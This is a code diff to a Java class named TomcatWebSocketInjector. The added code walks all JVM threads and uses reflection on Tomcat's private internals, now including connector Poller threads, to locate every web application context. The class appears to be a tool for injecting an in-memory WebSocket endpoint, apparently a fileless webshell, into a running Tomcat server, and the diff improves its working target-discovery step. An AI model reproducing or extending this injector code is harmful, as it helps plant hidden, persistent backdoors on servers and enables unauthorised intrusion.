@@ -80,11 +80,23 @@ public class TomcatWebSocketInjector {
         Set<Object> contexts = new HashSet<Object>();
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
-            if (thread.getName().contains("ContainerBackgroundProcessor")) {
-                HashMap<?, ?> childrenMap = (HashMap<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
+            String threadName = thread.getName();
+            if (threadName.contains("ContainerBackgroundProcessor")) {
+                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
                 for (Object value : childrenMap.values()) {
-                    HashMap<?, ?> children = (HashMap<?, ?>) getFieldValue(value, "children");
+                    Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
                     contexts.addAll(children.values());
+                }
+            } else if (threadName.contains("Poller") && !threadName.contains("ajp")) {
+                try {
+                    Object proto = getFieldValue(getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "handler"), "proto");
+                    Object engine = getFieldValue(getFieldValue(getFieldValue(getFieldValue(proto, "adapter"), "connector"), "service"), "engine");
+                    Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(engine, "children");
+                    for (Object value : childrenMap.values()) {
+                        Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
+                        contexts.addAll(children.values());
+                    }
+                } catch (Exception ignored) {
                 }
             } else if (thread.getContextClassLoader() != null) {
                 String name = thread.getContextClassLoader().getClass().getSimpleName();
